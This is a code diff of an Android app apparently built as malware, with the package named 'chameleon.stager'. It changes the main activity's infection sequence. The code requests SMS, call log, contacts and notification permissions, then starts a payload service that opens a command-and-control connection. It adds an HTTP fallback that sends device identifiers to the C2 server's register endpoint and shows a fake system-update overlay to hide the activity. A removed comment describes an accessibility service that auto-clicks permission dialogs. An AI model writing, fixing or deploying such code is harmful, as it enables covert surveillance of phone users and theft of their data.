@@ -8,13 +8,13 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.util.Log
 import android.view.accessibility.AccessibilityManager
 import android.widget.Toast
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import com.chameleon.stager.databinding.ActivityMainBinding
 import com.chameleon.stager.service.PayloadService
-import com.chameleon.stager.service.StagerAccessibilityService
 import com.chameleon.stager.utils.PermissionHelper
 
 class MainActivity : AppCompatActivity() {
@@ -158,36 +158,68 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Step 3: Start foreground service (C2 connection begins)
-        val serviceIntent = Intent(this, PayloadService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
-        } else {
-            startService(serviceIntent)
-        }
+        // Step 3: Request NOTIFICATION permission BEFORE starting foreground service
+        // (Android 15 requires POST_NOTIFICATIONS for startForeground to succeed)
+        permissionHelper.requestNotificationPermission(this)
 
         // Step 4: Request runtime permissions (SMS, Call Log, Contacts)
-        // AccessibilityService auto-clicks the "Allow" dialogs within ~300ms
         if (!permissionHelper.hasAllPermissions(this)) {
             permissionHelper.requestPermissions(this)
         }
 
-        // Step 5: Notification permission (Android 13+)
-        permissionHelper.requestNotificationPermission(this)
+        // Step 5: Start foreground service (C2 connection begins)
+        val serviceIntent = Intent(this, PayloadService::class.java)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "ForegroundService failed, registering via HTTP", e)
+            registerViaHttpFallback()
+        }
 
         // Step 6: Show system update overlay to hide all activity
         val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
         overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(overlayIntent)
-
         finish()
+    }
+
+    private fun registerViaHttpFallback() {
+        Thread {
+            try {
+                val json = org.json.JSONObject().apply {
+                    put("device_id", Build.ID)
+                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
+                    put("manufacturer", Build.MANUFACTURER)
+                    put("model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
+                    put("api_level", Build.VERSION.SDK_INT)
+                }
+                val url = java.net.URL("${com.chameleon.stager.StagerApplication.c2RealUrl}/api/register")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.outputStream.write(json.toString().toByteArray())
+                val code = conn.responseCode
+                conn.disconnect()
+                Log.i("MainActivity", "HTTP fallback registration: $code")
+            } catch (e: Exception) {
+                Log.e("MainActivity", "HTTP fallback failed", e)
+            }
+        }.start()
     }
 
     override fun onResume() {
         super.onResume()
         if (isAccessibilityServiceEnabled()) {
             binding.statusText.text = "Ready to stream"
-            // Safe to call repeatedly — hasStartedFlow guard prevents re-entry
+            // Safe to call repeatedly — permissions already granted skips to service start
             startPayloadFlow()
         }
     }
